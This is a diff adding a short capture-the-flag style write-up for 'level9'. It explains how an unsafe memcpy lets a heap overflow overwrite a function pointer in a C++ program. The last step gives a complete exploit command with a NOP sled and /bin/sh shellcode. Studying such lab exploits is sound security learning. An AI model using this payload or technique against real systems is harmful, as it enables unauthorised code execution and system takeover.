@@ -1,0 +1,7 @@
+1. We firstly saw that there are c++ functions that are from the N object
+2. In the main, there are two of those objects created with the ints 5 and 6 respectivly in those objects
+3. At the end a function is call from function address saved in the second object.
+4. In the first object, a function is call where an unsafe call of memcopy is made from the argv1
+5. Here, we detected a flaw because we can overflow in the heap on the second object, and so, overwrite the address of the function called at the end of the main.
+6. So the goal here is to create an argument that will have a bounce address (to redirect the flow in the heap), optionnal NOPs, a shellcode, some padding and the address we want to overwrite.
+7. It gives us this exploit command : ./level9 `perl -e 'print "\x11\xa0\x04\x08" . "\x90"x21 . "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" . "1"x62 . "\x0c\xa0\x04\x08"'`
